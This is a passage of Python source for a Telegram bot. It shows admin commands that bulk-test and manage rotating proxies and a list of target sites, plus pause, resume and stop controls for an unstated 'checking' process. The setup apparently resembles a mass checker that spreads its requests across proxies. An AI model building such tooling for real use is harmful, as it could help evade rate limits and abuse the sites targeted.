            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
        
    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"An error occurred: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        
        try:
            await status_msg.delete()
        except:
            pass
        
        await send_final_results(user_id, all_results)

# ========== PROXY COMMANDS ==========

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    proxies = load_proxies()
    if not proxies:
        return await event.reply(premium_emoji("❌ `proxy.txt` is empty. Nothing to check."), parse_mode='html')
    
    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies..."), parse_mode='html')
    
    alive_proxies = []
    dead_proxies = []
    batch_size = 50
    
    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])
            
            await status_msg.edit(premium_emoji(f"🔥 Checking proxies...\n\n<b>Checked:</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Dead:</b> {len(dead_proxies)}"), parse_mode='html')
        
        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")
        
        summary_msg = f"✅ <b>Proxy Check Complete!</b>\n\n<b>Total Proxies:</b> {len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Removed:</b> {len(dead_proxies)}\n\n<code>proxy.txt</code> has been updated with only working proxies."
        
        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    sites = load_sites()
    if not sites:
        return await event.reply(premium_emoji("❌ `sites.txt` is empty. Nothing to check."), parse_mode='html')
    
    proxies = load_proxies()
    if not proxies:
        return await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
    
    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."), parse_mode='html')
    
    alive_sites = []
    dead_sites = []
    batch_size = 10
    
    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies: 
                fresh_proxies = proxies
            
            tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])
            
            await status_msg.edit(premium_emoji(f"🔥 Checking sites...\n\n<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n<b>Alive:</b> {len(alive_sites)}\n<b>Dead:</b> {len(dead_sites)}"), parse_mode='html')
        
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        
        summary_msg = f"✅ <b>Site Check Complete!</b>\n\n<b>Total Sites:</b> {len(sites)}\n<b>Alive:</b> {len(alive_sites)}\n<b>Removed:</b> {len(dead_sites)}\n\n<code>sites.txt</code> has been updated."
        
        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rm'))
async def remove_site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/rm https://site.com</code>"), parse_mode='html')
    
    url_to_remove = args[1].strip()
    success, msg = remove_site(url_to_remove)
    
    await event.reply(premium_emoji(f"{'✅' if success else '❌'} <b>{msg}</b>\n\n<code>{url_to_remove}</code>"), parse_mode='html')

# ========== PROXY MANAGEMENT COMMANDS ==========

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            return await event.reply(premium_emoji("❌ Usage: `/addproxy` followed by proxies, one per line."), parse_mode='html')
        
        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            return await event.reply(premium_emoji("❌ No proxies provided."), parse_mode='html')
        
        current_proxies = load_proxies()
        new_proxies = []
        
        for proxy in proxies_to_add:
            if proxy not in current_proxies:
                new_proxies.append(proxy)
        
        if not new_proxies:
            return await event.reply(premium_emoji("⚠️ All provided proxies already exist in `proxy.txt`."), parse_mode='html')
        
        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")
        
        await event.reply(premium_emoji(f"✅ **Proxies Added Successfully!**\n\nAdded {len(new_proxies)} new proxies to `proxy.txt`."), parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error adding proxies: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        return await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
    
    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')
    
    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        return await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
    
    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies:
        return await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
    
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    
    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        return await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
    
    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        return await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
    
    current_proxies = load_proxies()
    if not current_proxies:
        return await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
    
    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)
    
    if not removed:
        return await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    
    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    current_proxies = load_proxies()
    count = len(current_proxies)
    
    if count == 0:
        return await event.reply(premium_emoji("❌ <code>proxy.txt</code> is already empty."), parse_mode='html')
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"
    
    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")
        
        await event.reply(premium_emoji(f"📦 <b>Backup Created!</b>\n\nSending backup of {count} proxies before clearing..."), file=backup_filename, parse_mode='html')
        
        try:
            os.remove(backup_filename)
        except:
            pass
    except Exception as e:
        return await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")
    
    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    current_proxies = load_proxies()
    if not current_proxies:
        return await event.reply(premium_emoji("❌ No proxies in <code>proxy.txt</code>"), parse_mode='html')
    
    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")
        
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')
        
        try:
            os.remove(filename)
        except:
            pass

# ========== CALLBACKS ==========

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer(premium_emoji("⏸️ Paused"))

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer(premium_emoji("▶️ Resumed"))

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer(premium_emoji("🛑 Stopped"))
        await event.edit(premium_emoji("😡 **Checking stopped by user.**"))

# ========== RESOLVE CHAT IDs ON STARTUP ==========
async def main():
    await resolve_chat_ids()
    print("✅ Bot started successfully!")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    with bot:
        bot.loop.run_until_complete(main())